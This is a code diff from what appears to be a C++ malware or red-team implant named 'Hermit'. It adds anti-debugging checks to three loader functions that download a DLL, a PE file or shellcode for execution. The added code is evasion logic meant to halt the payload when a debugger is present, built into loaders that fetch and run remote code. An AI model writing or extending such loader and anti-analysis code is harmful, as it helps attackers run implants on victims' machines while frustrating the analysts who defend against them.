@@ -93,10 +93,17 @@ namespace Hermit
     }
 
     VOID DLLLoader()
-    {        
+    {
         State::PSTATE pState = Init();
         if (!pState)
+        {
             return;
+        }
+
+        // Anti-Debug
+        #ifdef PAYLOAD_ANTI_DEBUG
+        Technique::AntiDebug::StopIfDebug(pState->pProcs);
+        #endif
 
         // Download DLL
         std::vector<BYTE> bytes = Download(pState);
@@ -127,7 +134,14 @@ namespace Hermit
     {
         State::PSTATE pState = Init();
         if (!pState)
+        {
             return;
+        }
+
+        // Anti-Debug
+        #ifdef PAYLOAD_ANTI_DEBUG
+        Technique::AntiDebug::StopIfDebug(pState->pProcs);
+        #endif
 
         // Download PE
         std::vector<BYTE> bytes = Download(pState);
@@ -156,10 +170,17 @@ namespace Hermit
     }
 
     VOID ShellcodeLoader()
-    {
+    {   
         State::PSTATE pState = Init();
         if (!pState)
+        {
             return;
+        }
+
+        // Anti-Debug
+        #ifdef PAYLOAD_ANTI_DEBUG
+        Technique::AntiDebug::StopIfDebug(pState->pProcs);
+        #endif
 
         // Download shellcode
         std::vector<BYTE> bytes = Download(pState);
